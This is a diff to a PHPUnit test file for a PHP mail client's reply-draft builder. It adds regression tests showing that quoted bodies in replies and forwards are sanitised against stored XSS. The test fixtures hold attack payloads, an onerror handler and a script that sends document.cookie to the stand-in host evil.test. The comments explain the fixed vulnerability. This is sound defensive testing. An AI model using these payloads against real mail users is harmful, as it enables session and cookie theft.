@@ -12,6 +12,7 @@ use App\Service\Mail\MailBodySanitizer;
 use App\Service\Mail\ReplyDraftBuilder;
 use App\Service\Mail\SignatureProvider;
 use DateTimeImmutable;
+use PHPUnit\Framework\Attributes\DataProvider;
 use PHPUnit\Framework\TestCase;
 use Psr\Log\NullLogger;
 use Symfony\Component\Routing\Generator\UrlGeneratorInterface;
@@ -30,16 +31,16 @@ final class ReplyDraftBuilderTest extends TestCase
 
     protected function setUp(): void
     {
-        // The real sanitiser, over a stub router: it is only reached when a
-        // signature is WRITTEN, and nothing here writes one — the builder only
-        // reads the settings bag. The URL generator behind it exists solely
-        // for the cid resolution a fragment never does.
-        $this->builder = new ReplyDraftBuilder(new SignatureProvider(
-            new MailBodySanitizer(
-                self::createStub(UrlGeneratorInterface::class),
-                new NullLogger(),
-            ),
-        ));
+        // The real sanitiser, over a stub router. It is reached twice now: when
+        // a signature is written, and — since the quote stopped being raw — on
+        // every quoted body. The URL generator behind it exists solely for the
+        // cid resolution a fragment never does.
+        $sanitizer = new MailBodySanitizer(
+            self::createStub(UrlGeneratorInterface::class),
+            new NullLogger(),
+        );
+
+        $this->builder = new ReplyDraftBuilder(new SignatureProvider($sanitizer), $sanitizer);
     }
 
     // ── addressing ───────────────────────────────────────────────────────────
@@ -225,6 +226,73 @@ final class ReplyDraftBuilderTest extends TestCase
         $body = (string) $this->builder->reply($original, $this->account())->bodyHtml;
 
         self::assertStringNotContainsString('<script>', $body);
+    }
+
+    /**
+     * The sender's BODY cannot inject markup either — which is the half that
+     * was missing.
+     *
+     * testAQuotedSenderNameCannotInjectMarkup above has guarded the attribution
+     * line since this class was written, and it passed throughout: the name is
+     * escaped, the date is escaped, the addresses are escaped. Every string
+     * around the quote was handled and the quote itself was pasted in raw, out
+     * of `bodyHtml` — the unsanitised field — into a draft the compose window
+     * writes into the app's own document with `|raw`.
+     *
+     * So the attack was: send a mail, wait for the reply. Reading it was safe;
+     * answering it ran the script in a session that can read every mail in the
+     * account and mint an API token that survives a password change.
+     *
+     * Data-provided over the three entry points because they are three methods
+     * that each call quote() separately, and a fix applied to one of them would
+     * otherwise look complete.
+     */
+    #[DataProvider('answeringMethods')]
+    public function testAQuotedBodyCannotInjectScript(string $method): void
+    {
+        $original           = $this->original();
+        $original->bodyHtml = '<p>Rechnung <img src=x onerror="alert(1)"> anbei</p>'
+            . '<script>fetch("//evil.test?c="+document.cookie)</script>';
+
+        $draft = 'forward' === $method
+            ? $this->builder->forward($original)
+            : $this->builder->reply($original, $this->account(), replyAll: 'replyAll' === $method);
+
+        $body = (string) $draft->bodyHtml;
+
+        self::assertStringNotContainsString('<script', $body, 'a script tag survived into the draft');
+        self::assertStringNotContainsString('onerror', $body, 'an event handler survived into the draft');
+        self::assertStringNotContainsString('evil.test', $body);
+    }
+
+    /**
+     * And the quote is still a quote afterwards.
+     *
+     * The cheap way to pass the test above is to drop the body, which would
+     * trade a security hole for a mail client that cannot quote. The words
+     * survive, the markup around them survives, only what executes is gone.
+     */
+    public function testSanitisingTheQuoteKeepsTheQuote(): void
+    {
+        $original           = $this->original();
+        $original->bodyHtml = '<p>Moin <b>Paul</b>, <a href="https://example.test/x">hier</a>'
+            . ' <img src="https://example.test/logo.png"> <img src=x onerror="alert(1)"></p>';
+
+        $body = (string) $this->builder->reply($original, $this->account())->bodyHtml;
+
+        self::assertStringContainsString('Moin', $body);
+        self::assertStringContainsString('<b>Paul</b>', $body);
+        self::assertStringContainsString('https://example.test/x', $body);
+        self::assertStringContainsString('https://example.test/logo.png', $body);
+        self::assertStringNotContainsString('onerror', $body);
+    }
+
+    /** @return iterable<string, array{string}> */
+    public static function answeringMethods(): iterable
+    {
+        yield 'reply'     => ['reply'];
+        yield 'reply-all' => ['replyAll'];
+        yield 'forward'   => ['forward'];
     }
 
     public function testAForwardCarriesTheOriginalHeadersIntoTheBody(): void
